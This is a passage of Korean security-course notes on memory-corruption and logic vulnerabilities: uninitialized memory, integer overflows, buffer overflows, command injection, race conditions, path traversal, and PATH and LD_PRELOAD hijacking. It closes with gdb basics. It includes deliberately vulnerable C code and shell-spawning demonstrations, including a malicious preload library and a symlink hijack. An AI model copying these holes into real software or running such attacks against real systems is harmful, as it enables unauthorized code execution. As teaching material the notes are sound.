프로그램의 규모가 커지거나 구조가 복잡해질수록 UAF 취약점은 생각지도 못한 곳에서 발생하곤 한다. 특히 여러 컴포넌트들이 결합된 형태의 프로그램에서는 그런 부분이 더욱 두드러진다. 가령 두 컴포넌트가 서로 상호작용하며 프로그램이 동작하는 경우, 한 컴포넌트에서 객체나 메모리의 사용이 끝났다고 판단해 해제했지만 다른 컴포넌트에서는 이 내용이 동기화되지 않아 그 포인터를 그대로 사용할 수 있다.

또, 이런 취약점은 취약점의 영향력을 판단하기 어렵다. 힙 메모리 할당자는 각자 동작이 다르기 때문. 그렇기 때문에 공격이 불가능하다고 알려진 버그가 실제로는 공격 가능했던 취약점인 경우도 있었다. 따라서 힙에서 발생하는 여러 취약점들을 공격하기 위해서는 각 메모리 할당자의 구현을 정확히 알아야 한다.

이에 대해서는 Heap Allocator Exploit 강의에서 자세히 알아볼 것이다.


# 3. 초기화되지 않은 메모리

```
// uninit1.c
typedef struct person {
    char *name;
    int age;
} Person;

int main(void) {
    Person p;
    unsigned int name_len;
    
    printf("Name length: ");
    scanf("%d", &name_len);
    
    if(name_len < 100)
        p.name = (char *)malloc(name_len);
    read(0, p.name, name_len);
    
    printf("Age: ");
    scanf("%d", &p.age);
    
    printf("Name: %s\n", p.name);
    printf("Age: %d\n", p.age);
}
```

C와 C++에서는 수많은 구조체들과 클래스들을 선언하고 이들의 인스턴스를 만들어낸다. 변수를 선언하거나 인스턴스를 생성할 때는, 프로그래머가 의도한 경우를 제외하고는 반드시 초기화해야 한다. 메모리를 초기화하지 않는다면 쓰레기 값이 들어가게 되고, 이는 프로그램의 흐름을 망가트릴 수 있다.

공격자가 메모리를 정교하게 조작해 초기화되지 않은 영역에 공격자의 입력이 들어간다고 생각해 보자. 만약 초기화되지 않은 메모리를 초기화되었다고 가정하는 코드가 있다면 이는 보안 취약점으로 이어질 수 있다.

uninit1.c의 구조체 Person은 char *형 변수 name과 int형 변수 age를 멤버변수로 갖는다.

main함수에서는 Person의 인스턴스를 선언한 후 name의 길이를 name_len 변수에 입력받는다. 만약 길이가 100보다 작으면 malloc 함수를 통해 메모리를 할당한 후 name_len만큼 입력받는다. 그러나 이 코드에서는 초기화되지 않은 값의 사용으로 인해 두 가지 문제가 발생한다.

첫 번째는, name에 할당된 메모리를 초기화하지 않는다는 것이다. read 함수는 입력받을 때 널 바이트와 같은 별도의 구분자를 붙이지 않다. 따라서 이후 name 을 출력하는 부분에서 초기화되지 않은 다른 메모리가 출력될 수 있다.

두 번째는, name_len 변수의 값이 100보다 크거나 같은 경우에 대한 예외 처리가 없다는 것이다. 이 경우 p.name 은 malloc 으로 할당된 값이 아니라 쓰레기 값이 된다. 만약 공격자가 이 값을 조작할 수 있다면, line 16에서 read함수를 통해 데이터를 입력받을 때 원하는 메모리 주소에 원하는 값을 쓸 수 있게 된다.



# 4. Integer issues

## 정수의 범위

![](https://i.imgur.com/OHnQORc.png)


C나 C++ 언어를 사용할 때 자주 발생하는 취약점들 중 하나는 정수의 형 변환을 제대로 고려하지 못해 발생하는 취약점이다. 특히 정수의 범위에 대한 정확한 이해 없이 작성된 코드는 자주 문제를 일으키는데, 이는 때로 치명적인 취약점을 발생시킬 수 있다. 따라서 먼저 C언어의 정수 자료형이 표현할 수 있는 범위를 정확히 알아야 한다.

오른쪽 표는 대표적인 정수 자료형들의 표현 범위를 정리한 표다.

size_t와 long 자료형은 아키텍쳐에 따라 표현할 수 있는 수의 범위가 달라진다. long 자료형은 32비트인 경우 int와 동일하고, 64비트인 경우 long long과 동일하다. size_t 자료형은 32비트일 때 unsigned int와 동일하며, 64비트일 때는 unsigned long과 같다.

## 묵시적 형변환

연산 시 연산의 피연산자로 오는 데이터들의 자료형이 서로 다를 경우, 다양한 종류의 형 변환이 일어나게 된다. 이 때 프로그래머가 자료형을 직접 명시해주지 않는다면 묵시적으로 형 변환이 발생한다. 프로그래머가 이런 형 변환에 대해 정확히 숙지하지 않는다면 이는 취약점으로 이어질 수 있다. 먼저 묵시적 형 변환에 대한 규칙들을 알아보도록 하겠다.

* 대입 연산 의 경우 대입 연산자의 좌변과 우변의 자료형이 다를 경우 묵시적 형 변환이 일어나게 된다. 작은 정수 자료형에 큰 정수를 저장하는 경우, 작은 정수의 크기에 맞춰서 상위 바이트가 소멸된다.

* 정수 승격 은 char이나 short같은 자료형이 연산될 때 일어난다. 이는 컴퓨터가 int형을 기반으로 연산하기 때문에 일어난다.

* 피연산자가 불일치할 경우 형 변환 일어난다. 이 경우 int< long< long long < float<double< long double 순으로 변환되며, 작은 바이트에서 큰 바이트로, 정수에서 실수로 형 변환이 일어나게 된다. 예를 들어, int와 double을 더하면 int가 double 형으로 변환된 후 연산이 진행된다.


## Integer issues


```
// int-1.c
#include <stdio.h>
#include <stdlib.h>
int main(void) {
    char *buf;
    int len;
    
    printf("Length: ");
    scanf("%d", &len);
    
    buf = (char *)malloc(len + 1);
    
    if(!buf) {
        printf("Error!");
        return -1;
    }
    
    read(0, buf, len);
}
```



앞서 설명한 규칙을 염두해 두면서 오른쪽의 int-1.c 코드를 살펴보자. 코드에서는 len 값을 사용자에게 입력받은 후 이후 len + 1 만큼 메모리를 할당받고 그 포인터를 buf에 저장한다. 그리고 read 함수를 통해 buf에 데이터를 len만큼 입력받는다.

그렇다면 공격자가 len 값으로 -1을 넣었을 때 프로그램의 흐름을 생각해 보자.

len = -1이므로 line 12에서는 buf = malloc(0)이 호출되고, 리눅스에서는 malloc의 인자가 0이라면 정상적인 힙 메모리가 반환된다. 이후 line 19에서 read(0, buf, -1)이 호출된다. 인자로 전달된 값은 int형 값 -1이고, read 함수의 세 번째 인자는 size_t 형이므로 묵시적 형 변환이 일어난다. 따라서 read 함수를 호출할 때, 32비트 아키텍처라고 가정하면 read(0, buf, pow(2, 32) - 1)이 호출된다.

그러므로 지정된 크기의 버퍼를 넘는 데이터를 넣을 수 있어 힙 오버플로우가 발생한다.


```
// int-2.c
char *create_tbl(unsigned int width, unsigned int height, char *row) {
	unsigned int n;
	int i;
	char *buf;
	n = width * height;
	buf = (char *)malloc(n);
	
	if(!buf)
		return NULL;
	for(i = 0; i < height; i++)
		memcpy(&buf[i * width], row, width);
	return buf;
}
```

int-2.c의 create_tbl 함수는 width, height 값과 초기화 데이터인 row 포인터를 인자로 받고 테이블을 초기화한다. line 8에서 width * height 크기의 테이블을 할당한 후 각 행에 init_row 데이터를 복사하게 된다.

그러나 width, height, n이 전부 unsigned int형의 변수이기 때문에 width * height가 pow(2, 32)를 넘어가면 의도하지 않은 값이 들어가게 된다. width가 65536이고 height가 65537이라고 가정하자. 이 경우 width * height의 값은 65536 * 65537 = pow(2, 32) + 65536이므로 실제로 저장되는 값은 65536 * 65537이 아닌 65536이 된다.

그러나 memcpy 함수에서는 반복문을 순회하면서 메모리를 복사하기 때문에 버퍼 오버플로우가 발생하게 된다.


```
char *read_data(int fd) {
	char *buf;
	int length = get_int(fd); // length는 사용자가 입력할 수 있는 값입니다.
	if(!(buf = (char *)malloc(MAX_SIZE))) // #define MAX_SIZE 0x8000
		error("malloc: %m");
	if(length < 0 || length + 1 >= MAX_SIZE) {
		free(buf);
		error("bad length: %d", value);
	}
	if(read(fd, buf, length) <= 0) {
		free(buf);
		error("read: %m");
	}
	
	buf[length] = '\0';
	return buf;
}
```

line 8의 if문을 보면, length < 0 || length + 1 > = MAX_SIZE인 경우 길이 검사를 통과하게 된다. length는 int형 변수이므로 length에 int형의 최대 값인 0x7FFFFFFF를 넣어 보겠다. 이 경우 length < 0은 거짓이고 length + 1은 0x80000000이 되므로 음수로 취급되어 length + 1 >= MAX_SIZE의 검사도 거짓이 된다. 따라서 line 13에서 read(fd, buf, 0x7FFFFFFF)가 호출되어 힙 오버플로우가 발생하게 된다.




# Memory Corruption C++

# 1. Buffer overflow in C++


## String buffer overflow

```
// g++ -o bof-1 bof-1.cpp
#include <iostream>
int main(void) {
  char buf[20];
  std::cin >> buf;
}
```


```
// g++ -o bof-2 bof-2.cpp
#include <iostream>
int main(void) {
  std::string buf;
  std::cin >> buf;
}
```



C++은 브라우저나 게임 엔진 등, 높은 성능을 요구하는 프로그램을 개발할 때 자주 사용되는 언어다. C++은 수많은 기능들을 제공하고, 끊임없는 버전 업데이트와 새로운 아이디어들이 추가되는 언어다. 그러나 C++은 C와 같이 프로그래머가 직접 메모리를 관리할 수 있는 여지가 있기 때문에 메모리 커럽션 취약점이 발생할 수 있다.

C++로 작성된 프로그램에서 발생하는 메모리 커럽션들은 복잡한 문법으로 인해 C에 비해 잘 드러나지 않는 경우가 있다. 이외에도 C++은 높은 추상화를 제공하기 때문에, 이런 높은 추상화 단계의 코드에서 취약점을 찾기 위해서는 C++에서 발생할 수 있는 보안 위협에 대해 정확히 이해해야 한다. 우선 C++에서 발생할 수 있는 버퍼 오버플로우 취약점에 살펴보도록 하자.

버퍼 오버플로우 취약점은 가장 대표적인 메모리 커럽션 취약점이다. 이는 버퍼의 경계 검사가 정확히 이루어지지 않아 발생하는 취약점으로, 버퍼에 할당된 영역을 넘어 다른 데이터를 오염시킬 수 있는 취약점이다.

bof-1은 20 바이트 크기의 버퍼를 할당하고 std::cin 함수를 통해 문자열을 입력받는다. std::cin은 입력받는 버퍼의 자료형에 따라 다양한 형태로 오버로딩된 함수 내용을 불러오는 표준 입력 함수다. 그러나 char형인 buf에 입력받는 경우에는 길이 검증이 없어 버퍼 오버플로우가 발생한다.

이 경우 bof-2와 같이 char형 버퍼에 문자열을 입력받는 것이 아닌, std::string 타입 버퍼에 입력받으면 문제는 해결된다. std::string은 char와는 다르게 입력받는 길이에 따라 자동으로 메모리를 할당하기 때문에 버퍼 오버플로우가 발생하지 않는다.





# Logical Bugs

```
// gcc -o logical logical.c 
#include <stdio.h>
int withdraw(int balance, int money) {
    return balance - money;
}
int main() {
    int balance = 10000;
    int amount = 0;
    int result = 0;
    printf("Your balance: %d\n\n", balance);
    printf("Please enter the amount to withdraw: ");
    scanf("%d", &amount);
    result = withdraw(balance, amount);
    printf("Check your balance: %d", result);
    return 0;
}
```





로지컬 버그는 프로그램의 메모리 관리 실수로 인해 발생하는 메모리 커럽션 취약점과 달리 프로그램의 논리적 오류로 인해 발생한다. 논리적 오류는 프로그램이 부정확하게 동작하지만 크래시가 발생하지 않는 경우다. 이와 같은 이유로 로지컬 버그는 발견하기 어려우며 오랜 시간 동안 발견되지 않은 채로 프로그램 내에 존재할 수도 있다.

이로 인해 프로그램이 기존의 의도대로 동작하지 않아 접근이 불가능한 자원에 접근하여 정보를 탈취하거나 조작할 수 있ㄷ. 이와 같은 문제는 C 혹은 C++과 같은 컴파일 언어 뿐만이 아닌 인터프리터 언어에서도 발생한다.

logical.c는 잔고에서 원하는 금액을 출금하는 C 코드 예제다. withdraw 함수에서는 잔고에서 출금 금액을 뺀 값이 반환되는데, 음수에 대한 예외처리가 없기 때문에 이는 잘못된 결과를 낼 수 있다.


## Command Injection

인젝션은 검증되지 않은 공격자의 입력을 셸 커맨드 또는 쿼리 일부로 처리해 정상적인 실행 흐름을 변경할 수 있는 취약점이다. 문자열을 Structured Query Language(SQL)의 일부로 처리하면서 발생하는 SQL 인젝션, 문자열의 일부를 셸 커맨드에서 처리하면서 발생하는 커맨드 인젝션이 대표적인 공격이다.

커맨드 인젝션은 프로그램이 적절한 검증 없이 사용자의 입력을 셸 명령어로 실행할 때 발생하는 취약점이다.

공격자는 메타문자와 같은 특수한 문자를 활용해 임의 코드 실행까지 이어지게 할 수 있다. 메타문자는 리눅스 셸 에서 여러 명령어를 한 줄로 실행할 수 있게 해 주는 특수문자다. 오른쪽의 그림은 메타문자에 대한 설명을 포함한 그림이다.


```
Meta 문자

설명

Example

$

쉘 환경변수

$ echo $PWD
/home/theori
&&

이전 명령어 실행 후 다음 명령어 실행

$ echo hello && echo theori
hello
theori
;

명령어 구분자

$ echo hello ; echo theori
hello
theori
|

명령어 파이핑

$ echo id | /bin/sh
uid=1001(theori) gid=1001(theori) groups=1001(theori)
*

와일드 카드

$ echo .*
. ..
`

명령어 치환

$ echo `echo hellotheori`
hellotheori
```

```
// gcc -o cmdi cmdi.c
#include <stdlib.h>
#include <stdio.h>
int main()
{
    char ip[36];
    char cmd[256] = "ping -c 2 "; 
	
    printf("Alive Checker\n");
    printf("IP: ");
    read(0, ip, sizeof(ip)-1);
    printf("IP Check: %s",ip);
    strcat(cmd, ip);
    system(cmd);
    return 0;
}

```

만약 입력에 IP나 도메인이 아닌 특수 문자를 사용한다면 원하는 명령어를 삽입하여 하나 이상의 명령어를 실행할 수 있다.
입력한 명령어 구분자로 인해 ping -c 2 127.0.0.1 명령어가 실행된 이후 /bin/sh가 실행된 것을 확인할 수 있다.
이와 같이 system함수를 실행할 때 사용자의 입력이 들어간다면 셸에서 특별한 의미를 갖는 메타문자에 대한 검증이 필요하다.



## Race condition

레이스 컨디션은 프로세스 혹은 스레드 간 자원 관리 실수로 인해 발생하는 상태다.

서로 다른 스레드에서 뮤텍스가 걸려 있지 않아 공유 메모리에 접근하는 경우 프로그램의 가정을 파괴할 수 있다. 이외에도 다양한 환경에서 발생할 수 있으며, 정확히 관리하지 않으면 프로그래머가 실수로 발생시키기 쉬운 오류다.


첫 번째 스레드에서 len 변수를 0으로 초기화하고 20 바이트의 배열을 생성한 후 len 변수에 20을 더한다. 이후에 스택 버퍼 오버플로우를 방지하기 위해 len 변수가 버퍼의 크기보다 크다면 프로그램을 종료하는 코드가 존재한다. 그러나 len 변수의 값은 20이기 때문에 해당 조건문은 통과하게 된다. 그리고 두 번째 스레드가 실행되면 len 값은 40이 되며, 이후 첫 번째 스레드에서 len 변수가 read 함수의 세 번째 인자로 전달돼 스택 버퍼 오버플로우가 발생한다.

그림과 같이 단일 스레드에서는 취약점이 발생하지 않는 코드라도 두 개 이상의 스레드가 자원을 동시에 참조할 수 있다면 취약점이 발생할 수 있다.


```
// gcc -o race1 race1.c -pthread
#include <stdio.h>
#include <pthread.h>
#include <time.h>
int count = 0;
void* counting() {
    for(int i=0;i<10000000;i++) {
        count += i;
    }
}
int main(int argc, char* argv[]) {
  pthread_t thread_id[3] = {0,};
  pthread_create(&thread_id[0], NULL, counting, (void*)NULL);
  pthread_create(&thread_id[1], NULL, counting, (void*)NULL);
  pthread_create(&thread_id[2], NULL, counting, (void*)NULL);
  sleep(1);
  printf("%d\n", count);
  return 0;
}
```

race1.c는 전역 변수인 count를 여러 개의 스레드가 덧셈 연산을 하는 예제다. counting 함수는 반복 횟수가 매우 많기 때문에 코드가 모두 실행되는데 시간이 걸린다. 그렇기 때문에 반복문이 끝나기 전에 다른 스레드가 count 전역 변수를 참조하여 덧셈 연산을 하게 되면서 결과가 달라지게 된다.




```
// gcc -o race2 race2.c -fno-stack-protector -lpthread -m32
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
int len;
void giveshell() {
    system("/bin/sh");
}
void * t_function() {
    int i = 0;
    while (i < 10000000) {
        len++;
        i++;
        sleep(1);
    }
}
int main() {
    char buf[4];
    int gogo;
    int idx;
    pthread_t p_thread;
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    while (1) {
        printf("1. thread create\n");
        printf("2. read buffer\n");
        printf("> ");
        scanf("%d", &idx);
        switch (idx) {
        case 1:
            pthread_create( &p_thread, NULL, t_function, (void * ) NULL);
            break;
        case 2:
            printf("len: ");
            scanf("%d", &len);
            if(len > sizeof(buf)) {
                exit(0);
            }
            sleep(4);
            printf("Data: ");
            read(0, buf, len);
            printf("Len: %d\n", len);
            printf("buf: %s\n", buf);
            break;
        case 3:
            if (gogo == 0x41414141) {
                giveshell();
            }
        }
    }
    return 0;
}

```

스레드간 공유 자원을 적절히 동기화하지 않았을 때 레이스 컨디션이 발생할 수 있다.

race2.c는 세 개의 메뉴가 존재한다.

1번 메뉴는 t_function 함수를 스레드로 실행한다. t_function 함수는 len 전역 변수를 i가 10000000 값에 도달할 때 까지 1씩 증가 시킨다. 2번 메뉴는 len 전역 변수에 입력을 받고 buf 배열의 크기보다 크다면 프로그램을 종료하여 스택 버퍼 오버플로우가 발생하지 않도록 하는 조건이 존재한다. 그리고 8초 후 buf 에 입력을 받는다. 3번 메뉴는 gogo 변수가 0x41414141이라면 giveshell 함수를 호출한다.

len 변수에 뮤텍스가 걸려있지 않기 때문에 스레드를 생성해 t_function 함수를 실행하면 여러 스레드가 len 변수를 동시에 참조할 수 있게 된다.

메뉴 2번에서 len 변수는 4보다 클 수 없다. 4를 입력하고 sleep이 호출되어 대기 중일 때 다른 스레드에서 t_function 함수가 실행되고 있다면 len 값은 증가하게 된다. 그러므로 read 함수가 호출될 때의 len 값은 버퍼의 크기보다 큰 값이 된다. 따라서 버퍼 오버플로우가 발생해 buf 뒤에 있는 gogo 변수를 원하는 값으로 덮을 수 있다.






2번 메뉴에서 4를 입력하고 4 바이트 이후에 4개의 A를 입력하면 gogo 변수를 0x41414141로 조작할 수 있다.

이후에 3번 메뉴를 호출하면 셸을 획득할 수 있다.

```
$ ./race2
1. thread create
2. read buffer
> 1
1. thread create
2. read buffer
> 2
len: 4
Data: BBBBAAAA
Len: 11
buf: BBBBAAAA
1. thread create
2. read buffer
> 3
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
```


## Path Traversal

Path Traversal은 프로그래머가 가정한 디렉토리를 벗어나 외부에 존재하는 파일에 접근할 수 있는 취약점이다. 리눅스의 계정 정보, 서비스의 설정 파일을 읽어 작업 디렉토리를 알아낼 수 있다면 소스 코드 유출, 계정 정보 유출 등으로 이어질 수 있기 때문에 매우 위험하다.

```
#include <stdio.h>
#include <string.h>
int main()
{
	char path[256] = "/tmp/";
	char file_buf[10240];
	char filename[256] = {0,};
	char cmd[256] = {0,};
	
	int len;
	FILE *fp;
	printf("Filename: ");
	fflush(stdout);
	len = read(0, filename, sizeof(filename)-1);
	filename[len-1] = '\0';
	strncat(path, filename, sizeof(path)-1);
	fp = fopen(path, "r");
	if(!fp) {
		return -1;
	}
	fread(file_buf, 1, sizeof(file_buf), fp);
	printf("%s\n", file_buf);
	fclose(fp);
	return 0;
}

```



path_traversal.c에서 path 변수는 선언되면서 "/tmp/" 문자열로 초기화된다. 그리고 read 함수를 통해 입력받은 filename을 strncat 함수로 path 변수에 복사한다. fopen 함수의 인자로 복사한 path 변수가 전달되고 파일이 존재한다면 해당 파일을 읽고 출력한다. 그러나 코드에는 .과 /와 같이 상위 디렉토리로 이동하는 문자들에 대한 검증이 존재하지 않기 때문에 공격자는 /tmp 디렉토리를 벗어나 다른 파일들을 읽어낼 수 있다.
![](https://i.imgur.com/MiVVk87.png)

../home/theori/path_traversal.c 를 넣어보면 된다.



## Environment Attack

환경 변수는 프로세스가 동작하는 방식에 영향을 미칠 수 있는 동적인 값들의 모임이다.

예를 들어, 사용자의 이름을 담고 있는 USER 환경 변수는 사용자가 바뀔 때마다 변경되어야 한다.


```
$ export | grep "USER"
declare -x USER="theori"
$ sudo -s
# export | grep "USER"
declare -x USER="root"
```

만약 hello 파일을 실행하기 위해 hello 명령어를 입력해도, 해당 파일이 현재 디렉토리에 없다면 이를 실행할 수 없다. hello 파일을 실행하기 위해서는 절대 경로를 입력해야 한다. 그러나 리눅스에는 수많은 명령어들이 있고, 이들은 모두 정해진 디렉토리 내에 있는 바이너리이다.

명령어를 실행할 때마다 절대 경로를 사용하는 것은 매우 번거로운 일이다. 리눅스에서는 이를 해결하기 위해 PATH라는 환경변수를 제공한다. PATH 환경 변수에 경로를 넣어두면 해당 경로에 있는 파일을 현재 디렉토리에 있는 파일과 같이 실행할 수 있다.

다음은 export 명령어를 통해 환경 변수를 출력한 결과이다.
```
$ export
declare -x HOME="/home/theori"
declare -x LANG="en_US.UTF-8"
declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
declare -x LESSOPEN="| /usr/bin/lesspipe %s"
declare -x LOGNAME="theori"
declare -x OLDPWD="/"
declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
declare -x PWD="/"
declare -x SHELL="/bin/sh"
declare -x SHLVL="1"
declare -x SUDO_GID="1001"
declare -x SUDO_UID="1001"
declare -x USER="theori"
```

다음은 PATH 환경 변수를 모두 삭제한 후 id 명령어를 실행하는 예제이다.

```
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
$ export PATH=""
$ id
bash: id: No such file or directory
$ export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
```

### 환경 변수 공격- PATH

```
// gcc -o environ1 environ1.c
#include <stdlib.h>
#include <unistd.h>
int main()
{
    printf("Screen Cleaner\n");
    system("clear");
         
    return 0;
}
```

environ1.c는 clear 명령어를 실행하는 코드이다. clear 명령어가 system 함수의 인자로 전달됐기 때문에 PATH 환경 변수를 읽어들여 해당 경로에 있는 clear 파일을 찾을 것이다. 때문에 PATH 환경변수를 조작한다면 원하는 파일을 실행시킬 수 있다.

그럼 아래와 같은 명령어로 PATH를 수정하고 예제 코드를 실행시켜보자.

```
$ export PATH=""
$ ./environ1
Screen Cleaner
sh: 1: clear: not found
```

PATH 환경 변수를 비워주고 실행했을 때, clear 파일을 찾지 못하고 에러를 출력시키게 된다.

만약 /bin/sh 파일을 심볼릭 링크를 사용하여 clear 이름으로 링킹 하면 어떻게 될지 생각해보아야 한다.

```
$ ln -s /bin/sh ./clear
$ export PATH=""
$ ./environ1
Screen Cleaner
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
```

/bin/sh 파일을 현재 위치한 경로에 clear 이름으로 심볼릭 링크를 걸고 PATH 환경 변수를 비워준 후에 예제 코드를 실행한 모습이다.

예제 파일에서 clear 명령어를 실행했는데 /bin/sh 파일이 실행되어 셸을 획득한 것을 확인할 수 있다. 이렇게 잘못된 경로 사용으로 인해 임의 코드 실행까지 이어질 수 있다는 것을 확인해보았다.

특정 명령어를 사용해야 할 경우에는 절대 경로를 사용하여 익스플로잇이 불가능하도록 만드는 것이 좋은 코드의 예이다.

```
system("/usr/bin/clear");
```

### 환경변수 공격-LD_PRELOAD

```
// gcc -o libc.so libc.c -fPIC -shared
#include <stdlib.h>
void read() {
	execve("/bin/sh", 0, 0);
}
```


```
// gcc -o environ2 environ2.c 
#include <unistd.h>
#include <stdio.h>
int main()
{
	char buf[16];
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 2, 0);
	write(1, "Data:", 5);
	read(0, buf, sizeof(buf)-1);
	
	write(1, "GOOD", 4);
        return 0;
}
```

LD_PRELOAD 환경 변수를 통해 로더가 프로세스에 로드할 라이브러리 파일을 지정할 수 있다. 프로그램에서 특정 함수를 호출하면 해당 환경 변수에 등록된 라이브러리 파일을 먼저 참조하여 호출된 함수를 찾게된다.

libc.c는 read 함수에서 execve("/bin/sh", 0, 0);를 실행하는 예제이다. 해당 예제를 주어진 컴파일 옵션으로 컴파일하면 libc.so라는 공유 라이브러리 파일이 생성된다. 만약 LD_PRELOAD 환경 변수에 생성한 공유 라이브러리 파일인 libc.so를 전달하면 모든 파일을 실행할 때 해당 파일을 참조하게 된다.

environ2.c는 write 함수로 "Data:" 문자열을 출력한 뒤에 read 함수로 버퍼에 입력을 받고 다시 "GOOD" 문자열을 출력하는 예제이다. 다음은 해당 예제의 실행 결과다.




```
$ ./environ2
Data:1234
GOOD
$ strace -if ./environ2
[00007ffff7ad9777] execve("./environ2", ["./environ2"], [/* 19 vars */]) = 0
...
[00007ffff7df22a7] open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
...
[00007ffff7b042c0] write(1, "Data:", 5Data:) = 5
[00007ffff7b04260] read(0, 1234
"1234\n", 15) = 5
[00007ffff7b042c0] write(1, "GOOD", 4GOOD)  = 4
[00007ffff7ad9748] exit_group(0)        = ?
```

environ2가 실행될 때 /lib/x86_64-linux-gnu/libc.so.6 라이브러리 파일을 로딩하여 write와 read 함수를 호출하는 것을 볼 수 있다. 다음은 LD_PRELOAD 환경 변수에 libc.so를 전달하고 environ2를 실행한 결과다.



```
$ export LD_PRELOAD="./libc.so"
$ ./environ2
Data:# id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
$ strace -if ./environ2
[00007ffff78d7777] execve("./environ2", ["./environ2"], [/* 20 vars */]) = 0
...
[00007ffff7df22a7] open("./libc.so", O_RDONLY|O_CLOEXEC) = 3
...
[00007ffff79022c0] write(1, "Data:", 5Data:) = 5
[00007ffff78d7777] execve("/bin/sh", NULL, NULL) = 0
...

```

LD_PRELOAD 환경 변수에 전달된 libc.so 파일을 로딩한 것을 알 수 있고, read 함수가 호출될 때 execve 시스템 콜이 호출된 것을 확인할 수 있다.

libc.c에서 read 함수는 execve("/bin/sh", 0, 0);를 실행한다. LD_PRELOAD 환경 변수에 libc.so를 전달했기 때문에 environ2를 실행할 때 로더는 해당 환경 변수를 참조하여 /lib/x86_64-linux-gnu/libc.so.6 라이브러리 파일 대신 ./libc.so 파일을 로딩한다. environ2에서 read 함수를 호출하면 libc.so 라이브러리 파일에서 read 함수를 찾고 실행하게 되면서 셸을 획득할 수 있다.


# Linux Exploitation & Mitigation Part 1


## ELF 동적 분석


바이너리를 분석할 때, 바이너리가 실행되며 변화하는 상태를 관찰하기 위해 동적 디버깅이 필요한 경우가 있다.

때문에 바이너리 공격 기법을 익히고 실습하기에 앞서, 리눅스의 실행 파일인 ELF 파일을 동적으로 디버깅하는 방법에 대해 알아보도록 하겠다.

ELF의 동적 분석을 위한 도구로는 gdb, strace, ltrace, IDA 등이 있다. 이 코스에서는 가장 유명한 ELF 디버거인 gdb(GNU Debugger)를 사용하여 ELF 바이너리를 동적 디버깅하는 방법에 대해 알아보겠다.

gdb의 디스어셈블리 문법에는 AT&T와 intel 두 종류가 있습니다. 이 중 널리 쓰이는 디스어셈블리 문법은 intel 이다. gdb 기본 설정에서의 디스어셈블리 문법은 AT&T이기 때문에, 디버깅 실습을 하기 전에 gdb의 디스어셈블리 문법을 intel로 바꾸어 주어야 한다.

.gdbinit는 gdb를 시작할 때 자동적으로 실행할 gdb 명령어들을 저장하고 있는 파일이다.

다음 명령어를 통해 .gdbinit에 gdb의 디스어셈블리 문법을 intel로 바꾸어 주는 명령어인 set disassembly-flavor intel을 추가할 수 있다.


.gdbinit 파일 수정
```
$ echo "set disassembly-flavor intel" >> ~/.gdbinit
$
```

disassembly-flavor 설정 확인
```
$ gdb -q
(gdb) show disassembly-flavor 
The disassembly flavor is "intel".
(gdb) 
```

## ELF 동적 분석 실습
```
// gcc -o example0 example0.c -m32
#include <stdio.h>
int main(void){
  int sum = 0;
  int val1 = 1;
  int val2 = 2;
  sum = val1 + val2;
  printf("1 + 2 = %d\n", sum);
  return 0;
}
```


example0.c는 1과 2의 덧셈 결과를 출력하는 예제입니다.

다음은 example0을 gdb의 인자로 전달한 결과입니다.

```
$ gdb ./example0
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./example0...(no debugging symbols found)...done.
(gdb) 
```

gdb는 커맨드 라인 기반으로 동작하는 디버거로, 명령어 입력을 통해 다양한 기능을 수행할 수 있습니다.

gdb에서 함수의 디스어셈블리 결과를 출력해주는 명령어는 disassemble, 혹은 disas입니다. disas 명령어를 사용하여 main 함수의 디스어셈블리 결과를 보겠습니다.

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804840b <+00>:	push   ebp
   0x0804840c <+01>:	mov    ebp,esp
   0x0804840e <+03>:	sub    esp,0xc
   0x08048411 <+06>:	mov    DWORD PTR [ebp-0x4],0x0
   0x08048418 <+13>:	mov    DWORD PTR [ebp-0x8],0x1
   0x0804841f <+20>:	mov    DWORD PTR [ebp-0xc],0x2
   0x08048426 <+27>:	mov    edx,DWORD PTR [ebp-0x8]
   0x08048429 <+30>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804842c <+33>:	add    eax,edx
   0x0804842e <+35>:	mov    DWORD PTR [ebp-0x4],eax
   0x08048431 <+38>:	push   DWORD PTR [ebp-0x4]
   0x08048434 <+41>:	push   0x80484d0
   0x08048439 <+46>:	call   0x80482e0 <printf@plt>
   0x0804843e <+51>:	add    esp,0x8
   0x08048441 <+54>:	mov    eax,0x0
   0x08048446 <+59>:	leave  
   0x08048447 <+60>:	ret    
End of assembler dump.
(gdb) 
```


0x804842e 주소에 브레이크포인트를 설정해 val1 + val2의 결과값이 저장된 eax 레지스터의 값을 살펴보겠습니다.

gdb에서 브레이크포인트를 설정하는 명령어는 break 혹은 b입니다.

```
(gdb) b *0x804842e
Breakpoint 1 at 0x804842e
(gdb) info break
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x0804842e <main+35>
(gdb) 
```

디버깅 중인 프로세스의 정보를 출력해주는 명령어인 info를 사용해 브레이크포인트가 정상적으로 설정된 것을 확인할 수 있습니다.

프로세스를 실행시켜 주는 명령어인 run (r)을 이용해 브레이크포인트가 설정된 지점까지 example0을 실행시켜 보겠습니다.

```
(gdb) r
Starting program: ~/example0 
Breakpoint 1, 0x0804842e in main ()
(gdb) info reg
eax            0x3	3
